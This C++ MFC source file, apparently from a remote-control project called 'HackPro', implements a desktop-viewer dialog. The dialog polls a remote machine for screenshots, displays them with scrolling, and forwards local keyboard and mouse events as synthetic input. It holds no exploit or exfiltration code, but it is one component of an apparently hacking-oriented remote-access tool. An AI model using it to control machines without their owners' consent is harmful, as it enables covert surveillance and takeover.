// Desktop.cpp : implementation file
//

#include "stdafx.h"
#include "HackPro.h"
#include "Desktop.h"
#include "HackClient.h"
#include "papahead.h"

//#include "dispview.h"

// CDesktop dialog
IMPLEMENT_DYNAMIC(CDesktop, CDialog)
/*CDesktop::CDesktop(CWnd* pParent )
	: CDialog(CDesktop::IDD, pParent)
{
}*/
CDesktop::CDesktop(CHackClient* Papa ): CDialog(CDesktop::IDD,AfxGetMainWnd())
{
	this->Parent=Papa;
	/*Register the call back functions here*/
	/*Papa->FT[CALLBACK_SYSCTRL]=CDesktop::*/
	Papa->FT[9]=CDesktop::CALLBACK_SetDesktop;
	Papa->FT[11]=CDesktop::CALLBACK_InputMsg;
	this->bmpdisp=NULL;
	this->isRefeshing=0;
	this->m_nTimer=NULL;

}
CDesktop::~CDesktop()
{
	//
}

void CDesktop::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_DISP, m_Disp);
}


BEGIN_MESSAGE_MAP(CDesktop, CDialog)
	ON_BN_CLICKED(IDOK, OnBnClickedOk)
	//	ON_WM_PAINT()
	ON_WM_MOUSEWHEEL()
	ON_WM_HSCROLL()
	ON_WM_VSCROLL()
	ON_WM_KEYDOWN()
	ON_WM_CHAR()
	ON_WM_TIMER()
	ON_WM_PAINT()
END_MESSAGE_MAP()


// CDesktop message handlers

void CDesktop::OnBnClickedOk()
{
	if(!this->isRefeshing)
	{
		m_nTimer = SetTimer(1, 1000, 0);
		this->SetDlgItemText(IDOK,"Stop Refreshing");
		this->isRefeshing=1;
		this->m_Disp.EnableWindow();
		this->m_Disp.SetFocus();
		
	}
	else
	{
		if(m_nTimer!=NULL)
		{
			this->KillTimer(this->m_nTimer);
		}
		m_nTimer=NULL;
		this->SetDlgItemText(IDOK,"Start Refreshing");
		this->isRefeshing=0;
		this->m_Disp.EnableWindow(FALSE);
		
	}
	
}


BOOL CDesktop::OnInitDialog()
{
	CDialog::OnInitDialog();
	CWnd* wnd=this;
	wnd->ShowScrollBar(SB_BOTH);
	wnd->EnableScrollBar(ESB_ENABLE_BOTH);
	SCROLLINFO sinfo;
	sinfo.cbSize=sizeof(SCROLLINFO);
	sinfo.nMin=0;
	sinfo.nMax=1024;
	sinfo.nPage=1;
	sinfo.fMask=SIF_ALL;
	sinfo.nPos=0;
	sinfo.nTrackPos=0;
	wnd->SetScrollInfo(SB_HORZ,&sinfo);
	sinfo.nMax=768;
	wnd->SetScrollInfo(SB_VERT,&sinfo);
	
	return TRUE;
	// EXCEPTION: OCX Property Pages should return FALSE
}
void* CDesktop::CALLBACK_SetDesktop(void* data,int size)
{
	int* RetData =new int[2];
	RetData[0]=0;
	RetData[1]=0;
	void* DefaultReturn=(void*)RetData;
	
	//Get the parameters
	WndBmp* param=(WndBmp*)data;
	CDesktop* This =(CDesktop*)param->This;
	void* pBits=(void*)(((char*)data)+sizeof(WndBmp));
	This->GetDisp(pBits,param->width,param->height);

	return DefaultReturn;
}
void CDesktop::GetDisp(void* pBits,int width,int height)
{
	// This functions restores the bitmap from the buffer (Pointed by pBits)
	if(this->bmpdisp!=NULL)
	{
		::DeleteObject((HGDIOBJ)bmpdisp);
	}
	HDC wnddc=::GetDC(this->m_hWnd);
	if(wnddc==NULL)
	{
		this->MessageBox("Error during GetDC()");
		return;
	}
	HDC bmpdc=::CreateCompatibleDC(wnddc);
	if(bmpdc==NULL)
	{
		this->MessageBox("Error during CreateCompatibleDC(wnddc)");
		::ReleaseDC(this->m_hWnd,wnddc);
		return;
	}
	bmpdisp=::CreateCompatibleBitmap(wnddc,width,height);
	if(bmpdisp==NULL)
	{
		this->MessageBox("Error during CreateCompatibleBitmap");
		::ReleaseDC(this->m_hWnd,wnddc);
		::DeleteDC(bmpdc);
		return;
	}
	(HBITMAP)SelectObject(bmpdc,bmpdisp);
	//-----------initialize the bitmap from recieved data-------------
	BITMAPINFOHEADER BmpInfoHeader;
	BmpInfoHeader.biSize = sizeof(BITMAPINFOHEADER);
	BmpInfoHeader.biWidth = width;
	BmpInfoHeader.biHeight=	height;
	BmpInfoHeader.biPlanes =1;
	BmpInfoHeader.biBitCount=24;
	BmpInfoHeader.biSizeImage =0;
	BmpInfoHeader.biXPelsPerMeter=0;
	BmpInfoHeader.biYPelsPerMeter=0;
	BmpInfoHeader.biClrUsed=0;
	BmpInfoHeader.biClrImportant=0;
	BmpInfoHeader.biCompression = BI_RGB;
	
	BITMAPINFO BmpInfo;
	BmpInfo.bmiHeader=BmpInfoHeader;
	RGBQUAD rgbquad;
	rgbquad.rgbBlue=255;
	rgbquad.rgbGreen=255;
	rgbquad.rgbRed=255;
	rgbquad.rgbReserved=0;
	BmpInfo.bmiColors[0]=rgbquad;
	SetDIBits(wnddc,bmpdisp,0,height,pBits,&BmpInfo,DIB_RGB_COLORS);
	//----------------------------------------------------------------
	//int i=::BitBlt(wnddc,0,0,width,height,bmpdc,0,0,SRCCOPY);
	//set the bars position
	RECT rect;
	CWnd* c=this->GetDlgItem(IDC_DISP);
	c->GetWindowRect(&rect);
	this->ScreenToClient(&rect);
	int swidth=(rect.right-rect.left);
	int sheight=(rect.bottom-rect.top);
    this->SetScrollRange(SB_HORZ,0,width-swidth);
	this->SetScrollRange(SB_VERT,0,height-sheight);
	int i=PaintDisp(wnddc,bmpdc);
	::ReleaseDC(this->m_hWnd,wnddc);
	::DeleteDC(bmpdc);	
}
int CDesktop::PaintDisp(HDC srcdc,HDC distdc)
{
	RECT rect;
	CWnd* c=this->GetDlgItem(IDC_DISP);
	c->GetWindowRect(&rect);
	this->ScreenToClient(&rect);
	int width=(rect.right-rect.left);
	int height=(rect.bottom-rect.top);
	int startx=this->GetScrollPos(SB_HORZ);
	int starty=this->GetScrollPos(SB_VERT);
	return BitBlt(srcdc,rect.left,rect.top,width,height,distdc,startx,starty,SRCCOPY);
}
int CDesktop::PaintDisp()
{
	HDC wnddc=::GetDC(this->m_hWnd);
	if(wnddc==NULL)
	{
		this->MessageBox("Error during GetDC()");
		return 0;
	}
	HDC bmpdc=::CreateCompatibleDC(wnddc);
	if(bmpdc==NULL)
	{
		this->MessageBox("Error during CreateCompatibleDC(wnddc)");
		::ReleaseDC(this->m_hWnd,wnddc);
		return 0;
	}
	(HBITMAP)SelectObject(bmpdc,bmpdisp);
	int i=PaintDisp(wnddc,bmpdc);
	::ReleaseDC(this->m_hWnd,wnddc);
	::DeleteDC(bmpdc);
	return i;

}
void CDesktop::OnNMThemeChangedVscroll(NMHDR *pNMHDR, LRESULT *pResult)
{
	
	*pResult = 0;
}

//void CDesktop::OnPaint()
//{
//	CPaintDC dc(this);
//	this->PaintDisp();
//}

BOOL CDesktop::OnMouseWheel(UINT nFlags, short zDelta, CPoint pt)
{
	CWnd* wnd=this;
	int val=wnd->GetScrollPos(SB_VERT);
	wnd->SetScrollPos(SB_VERT,val-zDelta);
	PaintDisp();
	return CDialog::OnMouseWheel(nFlags, zDelta, pt);
}

void CDesktop::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	// Get the minimum and maximum scroll-bar positions.
   int minpos;
   int maxpos;
   this->GetScrollRange(SB_HORZ,&minpos, &maxpos); 
   maxpos = this->GetScrollLimit(SB_HORZ);
  

   // Get the current position of scroll box.
   int curpos = this->GetScrollPos(SB_HORZ);

   // Determine the new position of scroll box.
   switch (nSBCode)
   {
   case SB_LEFT:      // Scroll to far left.
      curpos = minpos;
      break;

   case SB_RIGHT:      // Scroll to far right.
      curpos = maxpos;
      break;

   case SB_ENDSCROLL:   // End scroll.
      break;

   case SB_LINELEFT:      // Scroll left.
      if (curpos > minpos)
         curpos--;
      break;

   case SB_LINERIGHT:   // Scroll right.
      if (curpos < maxpos)
         curpos++;
      break;

   case SB_PAGELEFT:    // Scroll one page left.
   {
      // Get the page size. 
      SCROLLINFO   info;
      this->GetScrollInfo(SB_HORZ,&info, SIF_ALL);
   
      if (curpos > minpos)
      curpos = max(minpos, curpos - (int) info.nPage);
   }
      break;

   case SB_PAGERIGHT:      // Scroll one page right.
   {
      // Get the page size. 
      SCROLLINFO   info;
      this->GetScrollInfo(SB_HORZ,&info, SIF_ALL);

      if (curpos < maxpos)
         curpos = min(maxpos, curpos + (int) info.nPage);
   }
      break;

   case SB_THUMBPOSITION: // Scroll to absolute position. nPos is the position
      curpos = nPos;      // of the scroll box at the end of the drag operation.
      break;

   case SB_THUMBTRACK:   // Drag scroll box to specified position. nPos is the
      curpos = nPos;     // position that the scroll box has been dragged to.
      break;
   }
	this->SetScrollPos(SB_HORZ,curpos);
	PaintDisp();
	CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}

void CDesktop::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
	int minpos;
   int maxpos;
   this->GetScrollRange(SB_VERT,&minpos, &maxpos); 
   maxpos = this->GetScrollLimit(SB_VERT);
  

   // Get the current position of scroll box.
   int curpos = this->GetScrollPos(SB_VERT);

   // Determine the new position of scroll box.
   switch (nSBCode)
   {
   case SB_LEFT:      // Scroll to far left.
      curpos = minpos;
      break;

   case SB_RIGHT:      // Scroll to far right.
      curpos = maxpos;
      break;

   case SB_ENDSCROLL:   // End scroll.
      break;

   case SB_LINELEFT:      // Scroll left.
      if (curpos > minpos)
         curpos--;
      break;

   case SB_LINERIGHT:   // Scroll right.
      if (curpos < maxpos)
         curpos++;
      break;

   case SB_PAGELEFT:    // Scroll one page left.
   {
      // Get the page size. 
      SCROLLINFO   info;
      this->GetScrollInfo(SB_VERT,&info, SIF_ALL);
   
      if (curpos > minpos)
      curpos = max(minpos, curpos - (int) info.nPage);
   }
      break;

   case SB_PAGERIGHT:      // Scroll one page right.
   {
      // Get the page size. 
      SCROLLINFO   info;
      this->GetScrollInfo(SB_VERT,&info, SIF_ALL);

      if (curpos < maxpos)
         curpos = min(maxpos, curpos + (int) info.nPage);
   }
      break;

   case SB_THUMBPOSITION: // Scroll to absolute position. nPos is the position
      curpos = nPos;      // of the scroll box at the end of the drag operation.
      break;

   case SB_THUMBTRACK:   // Drag scroll box to specified position. nPos is the
      curpos = nPos;     // position that the scroll box has been dragged to.
      break;
   }
	this->SetScrollPos(SB_VERT,curpos);
	PaintDisp();
	CDialog::OnVScroll(nSBCode, nPos, pScrollBar);
}

void CDesktop::OnKeyDown(UINT nChar, UINT nRepCnt, UINT nFlags)
{
	
	CDialog::OnKeyDown(nChar, nRepCnt, nFlags);
}

void CDesktop::OnChar(UINT nChar, UINT nRepCnt, UINT nFlags)
{
	CDialog::OnChar(nChar, nRepCnt, nFlags);
}

BOOL CDesktop::PreTranslateMessage(MSG* pMsg)
{
	SendRemoteMessage(pMsg);
	return CDialog::PreTranslateMessage(pMsg);
}
void CDesktop::SendRemoteMessage(MSG* pMsg)
{
	UINT msgtype=pMsg->message;
	int i=0,CX=-1,CY=-1;
	CString str;
	
	RECT rect;
	CWnd* c=this->GetDlgItem(IDC_DISP);
	c->GetWindowRect(&rect);
	this->ScreenToClient(&rect);
	
	SynthInputReq Req;
	Req.This=(DWORD)this;
	Req.MsgType=2;
	Req.message=pMsg->message;
	Req.lParam=pMsg->lParam;
	Req.wParam=pMsg->wParam;

	int xPos = GET_X_LPARAM(pMsg->lParam); //Will be used in case of Mouse Event
	int yPos = GET_Y_LPARAM(pMsg->lParam); //Will be used in case of Mouse Event
	CX=xPos;
	CY=yPos;
	
	xPos=CovAbsX(xPos);
	yPos=CovAbsY(yPos);
	LPARAM lparam_to_send=MAKELPARAM(xPos,yPos);//in case of Mouse Event

	switch (msgtype)
	{
		case WM_KEYDOWN:
		case WM_KEYUP:
		case WM_SYSKEYDOWN:
		case WM_SYSKEYUP:
			Req.MsgType=INPUT_KEYBOARD;
			break;
		case WM_LBUTTONDBLCLK:
		case WM_LBUTTONDOWN:
		case WM_LBUTTONUP:
		case WM_MBUTTONDBLCLK:
		case WM_MBUTTONDOWN:
		case WM_MBUTTONUP:
		case WM_RBUTTONDBLCLK:
		case WM_RBUTTONDOWN:
		case WM_RBUTTONUP:
		case WM_MOUSEWHEEL:
			Req.MsgType=INPUT_MOUSE;
			Req.lParam=lparam_to_send;
			break;
		default:
			Req.MsgType=2;
			break;				
	}
	if(Req.MsgType==2)
	{
		return;
	}
	if(CX<rect.left || CX>rect.right || CY<rect.top || CY>rect.bottom)
	{
		return;
	}
	
	char* Data =new char[sizeof(SynthInputReq)];
	memcpy((void*)Data,&Req,sizeof(SynthInputReq));
	this->Parent->SendRequest(11,11,sizeof(SynthInputReq),Data);

}
int CDesktop::CovAbsX(int x)
{
	RECT rect;
	CWnd* c=this->GetDlgItem(IDC_DISP);
	c->GetWindowRect(&rect);
	this->ScreenToClient(&rect);
	int startx=this->GetScrollPos(SB_HORZ);
	int ret=startx + x - rect.left;
	return ret+12;
}
int CDesktop::CovAbsY(int y)
{
	RECT rect;
	CWnd* c=this->GetDlgItem(IDC_DISP);
	c->GetWindowRect(&rect);
	this->ScreenToClient(&rect);
	int starty=this->GetScrollPos(SB_VERT);
	int ret=starty + y - rect.top;	
	return ret+12;
}
void* CDesktop::CALLBACK_InputMsg(void* data,int size)
{
	
	return NULL;
}


void CDesktop::OnTimer(UINT nIDEvent)
{
	WINDOWPLACEMENT wpl;
	this->GetWindowPlacement(&wpl);
	GetWndBmpReq req;
	req.HWnd=0;
	req.This=(unsigned long)this;
	Parent->SendRequest(9,9,sizeof(GetWndBmpReq),&req);
	CDialog::OnTimer(nIDEvent);
}

void CDesktop::OnPaint()
{
	this->PaintDisp();
	CPaintDC dc(this); 
}


